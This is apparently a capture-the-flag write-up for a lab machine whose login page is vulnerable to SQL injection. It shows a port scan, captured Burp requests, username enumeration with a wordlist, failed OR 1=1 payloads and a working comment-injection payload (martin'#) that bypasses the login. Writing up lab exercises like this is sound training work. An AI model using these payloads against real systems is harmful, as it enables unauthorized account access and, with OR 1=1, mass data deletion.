```Description 
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

This is a relatively easy machine that tries to teach you a lesson, but perhaps you've already learned the lesson? Let's find out.
Treat this box as if it were a real target and not a CTF.  
Get past the login screen and you will find the flag. There are no rabbit holes, no hidden files, just a login page and a flag. Good luck!
```
IP-Address
```IP_Address
10.10.204.49
```

After Visiting http://<IP_Address>/ and Login Page show
```First_Attempt 
username : Admin
Password : [password omitted]
```

```Second_Attempt 
username : " OR "1"="1
Password : [password omitted]
```

```Third_Attempt 
username : ' OR 1=1#
Password : [password omitted]
```
and Error Pop-up
```Error
Oops! It looks like you injected an OR 1=1 or similar into the username field. This wouldn't have bypassed the login because every row in the users table was returned, and the login check only proceeds if one row matches the query.
However, your injection also made it into a DELETE statement, and now the flag is gone. Like, completely gone. You need to reset the box to restore it, sorry.
OR 1=1 is dangerous and should almost never be used for precisely this reason. Not even SQLmap uses OR unless you set --risk=3 (the maximum). Be better. Be like SQLmap.
Lesson learned?
```
which Reflects the Deletion of the Flag file need to restart machine 
and after restarting the machine we attempt 
Lets Start With RustScan 
```Bash
$ rustscan -a 10.10.190.252 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60
```

now when we there is only 2 ports lets navigate to `http://10.10190.252` and its an Login page using `BurpSuite` I first capture the Req 
```BurpSuite
POST / HTTP/1.1
Host: 10.10.190.252
Content-Length: 31
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.190.252
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.190.252/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
username=admin&password=[password omitted]
```
then I got output that Username & password is Incorrect 
when we try to use or inject SQL Injection it shows error and runs the Deletion of flag cause need to restart the machine
so we try to use burp for brute-force or guessing username first 
```Burp-Attack
using file name 
xato-net-10-million-usernames-dup.txt
and start attack and apply the filter Incorrect Password
which gives the username of the existing user
```

### Existing User
```List
martin
patrick
stuart
marcus
kelly
arnold
karen
sophia
veronica
```

With martin it worked we sent an request using burp where we use ` '# ` to comment out the rest of the request after username 
as it doesn't actually sending password to the server so what req. we send
```Burp-Reqest
POST / HTTP/1.1
Host: 10.10.190.252
Content-Length: 34
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.190.252
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.190.252/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
username=martin%27%23&password=[password omitted]
```
And Login Successful
```Output 
[flag omitted]
Well done! You bypassed the login without deleting the flag!

If you're confused by this message, you probably didn't even try an SQL injection using something like OR 1=1. Good for you, you didn't need to learn the lesson.

For everyone else who had to reset the box...lesson learned?

Using OR 1=1 is risky and should rarely be used in real world engagements. Since it loads all rows of the table, it may not even bypass the login, if the login expects only 1 row to be returned. Loading all rows of a table can also cause performance issues on the database. However, the real danger of OR 1=1 is when it ends up in either an UPDATE or DELETE statement, since it will cause the modification or deletion of every row.

For example, consider that after logging a user in, the application re-uses the username input to update a user's login status: UPDATE users SET online=1 WHERE username='<username>';

A successful injection of OR 1=1 here would cause every user to appear online. A similar DELETE statement, possibly to delete prior session data, could wipe session data for all users of the application.

Consider using AND 1=1 as an alternative, with a valid input (in this case a valid username) to test / confirm SQL injection.
```
Got the flag
```Flag
[flag omitted]
```